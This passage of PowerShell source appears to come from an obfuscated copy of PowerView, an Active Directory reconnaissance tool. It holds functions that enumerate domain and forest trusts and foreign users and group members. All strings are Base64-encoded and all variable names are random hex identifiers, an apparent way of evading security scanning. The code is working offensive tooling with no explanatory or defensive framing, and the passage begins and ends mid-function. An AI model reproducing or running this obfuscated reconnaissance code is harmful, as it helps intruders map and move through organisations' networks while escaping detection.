('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ba9d933f672140a4beb8c5a9c4eb6fbe}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ba9d933f672140a4beb8c5a9c4eb6fbe}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ba9d933f672140a4beb8c5a9c4eb6fbe}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ba9d933f672140a4beb8c5a9c4eb6fbe}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ba9d933f672140a4beb8c5a9c4eb6fbe}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ba9d933f672140a4beb8c5a9c4eb6fbe}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS 
{
        if ($PsCmdlet.ParameterSetName -ne 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBQAEkA')))) {
            ${280b58669fa34e0b943bface239581f5} = 
@{}
            if ($Domain -and $Domain.Trim() -ne '') {
             
   ${69fc450e03b54aa98454296726af7268} = $Domain
            }
        
    else {
                if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                    
${69fc450e03b54aa98454296726af7268} = (Get-Domain -Credential 
$Credential).Name
                }
                else {
             
       ${69fc450e03b54aa98454296726af7268} = (Get-Domain).Name
       
         }
            }
        }
        elseif 
($PsCmdlet.ParameterSetName -ne 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBFAFQA')))) {
            if ($Domain -and $Domain.Trim() -ne '') 
{
                ${69fc450e03b54aa98454296726af7268} = $Domain
       
     }
            else {
                
${69fc450e03b54aa98454296726af7268} = $Env:USERDNSDOMAIN
            
}
        }
        if ($PsCmdlet.ParameterSetName -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUAA=')))) {
            ${ee8cb49cef584fc3ba4b4f1cbcd93309} 
= Get-DomainSearcher @ba9d933f672140a4beb8c5a9c4eb6fbe
            
${03c3f20a98c64b7a88f2a39be2a6de10} = Get-DomainSID 
@280b58669fa34e0b943bface239581f5
            if 
(${ee8cb49cef584fc3ba4b4f1cbcd93309}) {
                
${ee8cb49cef584fc3ba4b4f1cbcd93309}.Filter = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQB0AHIAdQBzAHQAZQBkAEQAbwBtAGEAaQ
BuACkA')))
                if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBpAG4AZABPAG4AZQA=')))]) { ${9f78951ba80c437e9db41515f07bc24e} = 
${ee8cb49cef584fc3ba4b4f1cbcd93309}.FindOne() }
                else 
{ ${9f78951ba80c437e9db41515f07bc24e} = 
${ee8cb49cef584fc3ba4b4f1cbcd93309}.FindAll() }
                
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                    ${2ef76687a9164b48b41ad0981ae56bea} = 
$_.Properties
                    ${caebe295c991492faa430dd3754a9d4d} 
= New-Object PSObject
                    
${2b0982404b6a4bc1b43588efd287aaaa} = @()
                    
${2b0982404b6a4bc1b43588efd287aaaa} += 
${b226ee4d9aef4de4af1b31e2e2a8ecc1}.Keys | Where-Object { 
${2ef76687a9164b48b41ad0981ae56bea}.trustattributes[0] -band $_ } | 
ForEach-Object { ${b226ee4d9aef4de4af1b31e2e2a8ecc1}[$_] }
           
         ${f0f2785a98d049168c21df4f7832c2a6} = Switch 
(${2ef76687a9164b48b41ad0981ae56bea}.trustdirection) {
               
         0 { $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) }
         
               1 { $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('SQBuAGIAbwB1AG4AZAA='))) }
             
           2 { $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwB1AHQAYgBvAHUAbgBkAA=='))) }
         
               3 { $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QgBpAGQAaQByAGUAYwB0AGkAbwBuAGEAbAA='))) }
                    }
    
                ${9c1634c24a824846a9e77df0e2bb36ef} = Switch 
(${2ef76687a9164b48b41ad0981ae56bea}.trusttype) {
                    
    1 { $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VwBJAE4ARABPAFcAUwBfAE4ATwBOAF8AQQBDAFQASQBWAEUAXwBEAEkAUgBFAEMAVA
BPAFIAWQA='))) }
                        2 { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwBJAE4ARABPAFcAUwBfAEEAQwBUAEkAVgBFAF8ARABJAFIARQBDAFQATwBSAFkA')
)) }
                        3 { 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBJAFQA'))) }
                    }
                    
${f0e9f07d3fbc46fb90790e4e869492fb} = 
${2ef76687a9164b48b41ad0981ae56bea}.distinguishedname[0]
             
       ${a12812111c8646929c7746c87eb68c1a} = 
${f0e9f07d3fbc46fb90790e4e869492fb}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))
                    if 
(${a12812111c8646929c7746c87eb68c1a}) {
                        
${69fc450e03b54aa98454296726af7268} = 
$(${f0e9f07d3fbc46fb90790e4e869492fb}.SubString
(${a12812111c8646929c7746c87eb68c1a})) -replace 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))),'' -replace ',','.'
                    }
              
      else {
                        
${69fc450e03b54aa98454296726af7268} = ""
                    }
        
            ${7ee32b7a20574ed2bf5987c8682ada02} = 
${f0e9f07d3fbc46fb90790e4e869492fb}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('LABDAE4APQBTAHkAcwB0AGUAbQA='))))
                    if 
(${a12812111c8646929c7746c87eb68c1a}) {
                        
$TargetDomain = ${f0e9f07d3fbc46fb90790e4e869492fb}.SubString(3, 
${7ee32b7a20574ed2bf5987c8682ada02}-3)
                    }
          
          else {
                        $TargetDomain = ""
           
         }
                    ${68653c9dc37940078186b628e5dca88a} = 
New-Object Guid @(,${2ef76687a9164b48b41ad0981ae56bea}.objectguid
[0])
                    ${e12fad257af9417d951d1e88fc2951fd} = (New-
Object System.Security.Principal.SecurityIdentifier
(${2ef76687a9164b48b41ad0981ae56bea}.securityidentifier
[0],0)).Value
                    ${caebe295c991492faa430dd3754a9d4d} 
| Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) 
${69fc450e03b54aa98454296726af7268}
                    
${caebe295c991492faa430dd3754a9d4d} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABhAHIAZwBlAHQATgBhAG0AZQA='))) 
${2ef76687a9164b48b41ad0981ae56bea}.name[0]
                    
${caebe295c991492faa430dd3754a9d4d} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VAByAHUAcwB0AFQAeQBwAGUA'))) ${9c1634c24a824846a9e77df0e2bb36ef}
   
                 ${caebe295c991492faa430dd3754a9d4d} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA'))) 
$(${2b0982404b6a4bc1b43588efd287aaaa} -join ',')
                    
${caebe295c991492faa430dd3754a9d4d} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VAByAHUAcwB0AEQAaQByAGUAYwB0AGkAbwBuAA=='))) 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7AGYAMABmADIANwA4ADUAYQA5ADgAZAAwADQAOQAxADYAOABjADIAMQBkAGYANA
BmADcAOAAzADIAYwAyAGEANgB9AA==')))
                    
${caebe295c991492faa430dd3754a9d4d} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwBoAGUAbgBDAHIAZQBhAHQAZQBkAA=='))) 
${2ef76687a9164b48b41ad0981ae56bea}.whencreated[0]
                   
 ${caebe295c991492faa430dd3754a9d4d} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwBoAGUAbgBDAGgAYQBuAGcAZQBkAA=='))) 
${2ef76687a9164b48b41ad0981ae56bea}.whenchanged[0]
                   
 ${caebe295c991492faa430dd3754a9d4d}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBMAEQAQQ
BQAA=='))))
                    ${caebe295c991492faa430dd3754a9d4d}
   
             }
                if 
(${9f78951ba80c437e9db41515f07bc24e}) {
                    try { 
${9f78951ba80c437e9db41515f07bc24e}.dispose() }
                    
catch {
                        Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABdACAARQByAHIAbwByACAAZA
BpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAG
IAagBlAGMAdAA6ACAAJABfAA==')))
                    }
                
}
                ${ee8cb49cef584fc3ba4b4f1cbcd93309}.dispose()
       
     }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBQAEkA')))) {
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) {
                
${ab84f0a8e4bc47b5a19c833191ba6e30} = $Server
            }
           
 elseif ($Domain -and $Domain.Trim() -ne '') {
                
${ab84f0a8e4bc47b5a19c833191ba6e30} = $Domain
            }
           
 else {
                ${ab84f0a8e4bc47b5a19c833191ba6e30} = $Null
   
         }
            ${3cb25c0653624048a18c1e94cd5422f2} = 
[IntPtr]::Zero
            ${3349f6a31bb7469eb727814b53b17beb} = 63
   
         ${e0504a06cce1402faac956ced864ed9c} = 0
            
${cb7c2f5226ed472aad598a82813f1629} = 
${b65b271ff93e4a76a0ec16347a31f911}::DsEnumerateDomainTrusts
(${ab84f0a8e4bc47b5a19c833191ba6e30}, 
${3349f6a31bb7469eb727814b53b17beb}, 
[ref]${3cb25c0653624048a18c1e94cd5422f2}, 
[ref]${e0504a06cce1402faac956ced864ed9c})
            $Offset = 
${3cb25c0653624048a18c1e94cd5422f2}.ToInt64()
            if 
((${cb7c2f5226ed472aad598a82813f1629} -eq 0) -and ($Offset -gt 0)) 
{
                ${212b5abc53674a08833ac540af56a71e} = 
${45f560d8fa2c44118cc0339c2d7596e3}::GetSize()
                for 
(${9e5bb180fda8451b8ec7f5d4ed0667a4} = 0; 
(${9e5bb180fda8451b8ec7f5d4ed0667a4} -lt 
${e0504a06cce1402faac956ced864ed9c}); 
${9e5bb180fda8451b8ec7f5d4ed0667a4}++) {
                    
${dffff067b0bb45ce8471f1eab3733053} = New-Object System.Intptr -
ArgumentList $Offset
                    
${3893d1cccfdb4991a1cf64ee551c52b6} = 
${dffff067b0bb45ce8471f1eab3733053} -as 
${45f560d8fa2c44118cc0339c2d7596e3}
                    $Offset = 
${dffff067b0bb45ce8471f1eab3733053}.ToInt64()
                    
$Offset += ${212b5abc53674a08833ac540af56a71e}
                    
${6d87af06ff884460a7b63ff381812d79} = ''
                    
${cb7c2f5226ed472aad598a82813f1629} = 
${d8402eaefa6844d19815430c6481b92a}::ConvertSidToStringSid
(${3893d1cccfdb4991a1cf64ee551c52b6}.DomainSid, 
[ref]${6d87af06ff884460a7b63ff381812d79});
${540d2c2f94624a079816177d2dca65b6} = 
[Runtime.InteropServices.Marshal]::GetLastWin32Error()
               
     if (${cb7c2f5226ed472aad598a82813f1629} -eq 0) {
                
        Write-Verbose "[Get-DomainTrust] Error: 
$(([ComponentModel.Win32Exception] 
${540d2c2f94624a079816177d2dca65b6}).Message)"
                    }
  
                  else {
                        
${caebe295c991492faa430dd3754a9d4d} = New-Object PSObject
            
            ${caebe295c991492faa430dd3754a9d4d} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) 
${69fc450e03b54aa98454296726af7268}
                        
${caebe295c991492faa430dd3754a9d4d} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABhAHIAZwBlAHQATgBhAG0AZQA='))) 
${3893d1cccfdb4991a1cf64ee551c52b6}.DnsDomainName
                    
    ${caebe295c991492faa430dd3754a9d4d} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABhAHIAZwBlAHQATgBlAHQAYgBpAG8AcwBOAGEAbQBlAA=='))) 
${3893d1cccfdb4991a1cf64ee551c52b6}.NetbiosDomainName
                
        ${caebe295c991492faa430dd3754a9d4d} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))) 
${3893d1cccfdb4991a1cf64ee551c52b6}.Flags
                        
${caebe295c991492faa430dd3754a9d4d} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABhAHIAZQBuAHQASQBuAGQAZQB4AA=='))) 
${3893d1cccfdb4991a1cf64ee551c52b6}.ParentIndex
                      
  ${caebe295c991492faa430dd3754a9d4d} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VAByAHUAcwB0AFQAeQBwAGUA'))) 
${3893d1cccfdb4991a1cf64ee551c52b6}.TrustType
                        
${caebe295c991492faa430dd3754a9d4d} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA'))) 
${3893d1cccfdb4991a1cf64ee551c52b6}.TrustAttributes
                  
      ${caebe295c991492faa430dd3754a9d4d} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABhAHIAZwBlAHQAUwBpAGQA'))) ${6d87af06ff884460a7b63ff381812d79}
   
                     ${caebe295c991492faa430dd3754a9d4d} | Add-
Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABhAHIAZwBlAHQARwB1AGkAZAA='))) 
${3893d1cccfdb4991a1cf64ee551c52b6}.DomainGuid
                       
 ${caebe295c991492faa430dd3754a9d4d}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBBAFAASQ
A='))))
                        ${caebe295c991492faa430dd3754a9d4d}
   
                 }
                }
                $Null = 
${b65b271ff93e4a76a0ec16347a31f911}::NetApiBufferFree
(${3cb25c0653624048a18c1e94cd5422f2})
            }
            else 
{
                Write-Verbose "[Get-DomainTrust] Error: 
$(([ComponentModel.Win32Exception] 
${cb7c2f5226ed472aad598a82813f1629}).Message)"
            }
        
}
        else {
            ${5141d39988144458b175d0cb92f14808} = 
Get-Domain @280b58669fa34e0b943bface239581f5
            if 
(${5141d39988144458b175d0cb92f14808}) {
                
${5141d39988144458b175d0cb92f14808}.GetAllTrustRelationships() | 
ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBOAEUAVA
A='))))
                    $_
                }
            }
        
}
    }
}
function Get-ForestTrust {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        
[Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
     
   [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
${726b3a0c878447deabba8b1d3f1fb564} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { 
${726b3a0c878447deabba8b1d3f1fb564}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${726b3a0c878447deabba8b1d3f1fb564}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${86c262a44165441bac42031e458bc895} = Get-Forest 
@726b3a0c878447deabba8b1d3f1fb564
        if 
(${86c262a44165441bac42031e458bc895}) {
            
${86c262a44165441bac42031e458bc895}.GetAllTrustRelationships() | 
ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAHMAdABUAHIAdQBzAHQALgBOAEUAVA
A='))))
                $_
            }
        }
    }
}
function Get-
DomainForeignUser {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
     
   [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        
[Alias('Filter')]
        [String]
        $LDAPFilter,
        
[ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
     
   [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
       
 [Alias('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet
('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        
$SecurityMasks,
        [Switch]
        $Tombstone,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${ea43c787582f45539b7f519da4680c7a} = @{}
        
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABtAGUAbQBiAGUAcgBvAGYAPQAqACkA')))
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UgBhAHcA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))] = $Raw }
    }
    PROCESS {
        Get-DomainUser 
@ea43c787582f45539b7f519da4680c7a  | ForEach-Object {
            
ForEach (${47f30890dfa342de81bf704f9296bef7} in $_.memberof) {
       
         ${c68528a70f324585a5d8f3a63646d980} = 
${47f30890dfa342de81bf704f9296bef7}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))
                if 
(${c68528a70f324585a5d8f3a63646d980}) {
                    
${e7b22e8963a14a049819cb0cd46c57ce} = 
$(${47f30890dfa342de81bf704f9296bef7}.SubString
(${c68528a70f324585a5d8f3a63646d980})) -replace 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))),'' -replace ',','.'
                    
${86d1b3b6050643b8a7c372cd65e2a5be} = $_.distinguishedname
           
         ${439f52a3afcd4ae398890c46010f4871} = 
${86d1b3b6050643b8a7c372cd65e2a5be}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))
                    $UserDomain = 
$($_.distinguishedname.SubString
(${439f52a3afcd4ae398890c46010f4871})) -replace 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))),'' -replace ',','.'
                    if 
(${e7b22e8963a14a049819cb0cd46c57ce} -ne $UserDomain) {
              
          $GroupName = ${47f30890dfa342de81bf704f9296bef7}.Split
(',')[0].split('=')[1]
                        
${5dd901a1436c4373b12eb414beefb568} = New-Object PSObject
            
            ${5dd901a1436c4373b12eb414beefb568} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) 
$UserDomain
                        
${5dd901a1436c4373b12eb414beefb568} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBOAGEAbQBlAA=='))) $_.samaccountname
                     
   ${5dd901a1436c4373b12eb414beefb568} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUA'))) 
$_.distinguishedname
                        
${5dd901a1436c4373b12eb414beefb568} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) 
${e7b22e8963a14a049819cb0cd46c57ce}
                        
${5dd901a1436c4373b12eb414beefb568} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                        
${5dd901a1436c4373b12eb414beefb568} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) 
${47f30890dfa342de81bf704f9296bef7}
                        
${5dd901a1436c4373b12eb414beefb568}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAGkAZwBuAFUAcwBlAHIA'))))
      
                  ${5dd901a1436c4373b12eb414beefb568}
                
    }
                }
            }
        }
    }
}
function Get-
DomainForeignGroupMember {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
     
   [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
     
   [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        
[ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
  
      $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String
[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        
[Alias('ADSPath')]
        [String]
        $SearchBase,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 
'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        
[Switch]
        $Tombstone,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${ea43c787582f45539b7f519da4680c7a} = @{}
        
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABtAGUAbQBiAGUAcgA9ACoAKQA=')))
        if ($PSBoundParameters
